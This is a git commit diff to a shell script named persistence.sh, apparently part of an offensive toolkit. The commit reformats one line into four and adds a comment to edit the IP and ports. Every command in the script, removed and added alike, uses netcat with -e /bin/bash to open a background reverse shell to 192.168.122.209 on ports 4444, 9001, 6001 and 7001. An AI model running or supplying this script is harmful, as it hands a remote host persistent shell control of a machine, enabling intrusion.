4b1263d33c93668e14ac15c0c663c41127829615
Tactile <54464070+ChoctawChief@users.noreply.github.com>
2022-10-12 17:37:03 -0500

    Update persistence.sh

--- persistence/persistence.sh
+++ persistence/persistence.sh
@@ -1,2 +1,6 @@
 #!/bin/bash
-nohup  nc -e /bin/bash 192.168.122.209 4444 &  nc -e /bin/bash 192.168.122.209 9001 & nc -e /bin/bash 192.168.122.209 6001 & nc -e /bin/bash 192.168.122.209 7001
+#edit ip and ports for your local config
+nohup  nc -e /bin/bash 192.168.122.209 4444 & 
+ nc -e /bin/bash 192.168.122.209 9001 & 
+nc -e /bin/bash 192.168.122.209 6001 & 
+nc -e /bin/bash 192.168.122.209 7001
